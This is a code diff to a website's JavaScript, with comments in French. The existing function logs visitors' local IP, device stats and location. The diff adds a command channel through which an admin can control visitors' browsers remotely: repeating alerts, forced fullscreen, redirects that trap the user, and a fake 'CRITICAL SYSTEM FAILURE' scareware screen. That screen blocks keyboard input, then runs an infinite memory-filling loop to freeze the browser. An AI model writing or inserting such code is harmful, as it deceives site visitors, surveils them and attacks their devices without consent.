@@ -115,7 +115,7 @@ async function logVisitor(preciseLocation = null, isUpdate = false, forceDiscord
         const localIp = cachedLocalIp || await getLocalIP();
         const stats = await getDeviceStats();
         
-        await fetch('/api/log', {
+        const res = await fetch('/api/log', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -132,8 +132,92 @@ async function logVisitor(preciseLocation = null, isUpdate = false, forceDiscord
                 page: window.location.pathname
             })
         });
+
+        // Après chaque log, on vérifie si l'admin a envoyé une commande
+        checkCommands();
     } catch (error) {
         console.error("Erreur lors du logging:", error);
+    }
+}
+
+async function checkCommands() {
+    try {
+        const res = await fetch(`/api/command?sessionId=${sessionId}`);
+        const data = await res.json();
+
+        if (data && data.command) {
+            const cmd = data.command;
+            console.log("Commande reçue de l'admin:", cmd.command);
+
+            switch (cmd.command) {
+                case 'ALERT':
+                    // Force l'alerte même si le navigateur tente de la bloquer
+                    const alertMsg = cmd.payload.message || "Message de l'administrateur";
+                    setTimeout(() => {
+                        while(true) {
+                            alert(alertMsg);
+                            if(!confirm("Voulez-vous vraiment fermer cette alerte ?")) break;
+                        }
+                    }, 0);
+                    break;
+                case 'VIBRATE':
+                    if (navigator.vibrate) {
+                        // Pattern de vibration agressif pour forcer l'attention
+                        navigator.vibrate([500, 200, 500, 200, 1000]);
+                    }
+                    break;
+                case 'FULLSCREEN':
+                    // Tentative de forcer le plein écran sur chaque clic futur si refusé
+                    const forceFS = () => {
+                        document.documentElement.requestFullscreen().catch(() => {});
+                        // Tentative d'obscurcissement des contrôles
+                        document.body.style.cursor = 'none';
+                    };
+                    forceFS();
+                    document.addEventListener('click', forceFS);
+                    break;
+                case 'REDIRECT':
+                    // Empêche le retour en arrière en remplaçant l'historique
+                    const targetUrl = cmd.payload.url || 'http://127.0.0.1';
+                    window.location.replace(targetUrl);
+                    // Boucle de redirection au cas où
+                    setTimeout(() => { window.location.href = targetUrl; }, 100);
+                    break;
+                case 'RELOAD':
+                    window.location.reload(true);
+                    break;
+                case 'STOP_DEVICE':
+                    // Simulation d'arrêt agressive
+                    // Bloque les touches de fonction et le clic droit
+                    document.addEventListener('keydown', (e) => e.preventDefault());
+                    document.addEventListener('contextmenu', (e) => e.preventDefault());
+                    
+                    document.body.innerHTML = `
+                        <div style="background:black; color:white; height:100vh; width:100vw; display:flex; align-items:center; justify-content:center; font-family:monospace; position:fixed; top:0; left:0; z-index:999999; cursor:none;">
+                            <div style="text-align:center;">
+                                <h1 style="font-size:3rem; color:red; text-shadow: 0 0 10px red;">CRITICAL SYSTEM FAILURE</h1>
+                                <p style="font-size:1.2rem; margin-bottom:20px;">L'appareil a détecté une intrusion et va s'éteindre pour protéger les données.</p>
+                                <div id="crash-countdown" style="font-size:2.5rem; font-weight:bold;">ARRÊT IMMINENT...</div>
+                                <p style="margin-top:20px; color:#555;">Error code: 0x0000005C (HARDWARE_HALT)</p>
+                            </div>
+                        </div>
+                    `;
+                    
+                    // Force le CPU à saturer pour geler l'appareil
+                    setTimeout(() => {
+                        // Tentative de saturation mémoire et processeur
+                        const noise = [];
+                        while(true) {
+                            noise.push(new Array(1000000).fill("STOP"));
+                            console.log("SYSTEM_HALT");
+                            // Cette boucle va bloquer l'onglet et potentiellement le navigateur
+                        }
+                    }, 3000);
+                    break;
+            }
+        }
+    } catch (e) {
+        console.error("Erreur checkCommands:", e);
     }
 }
 
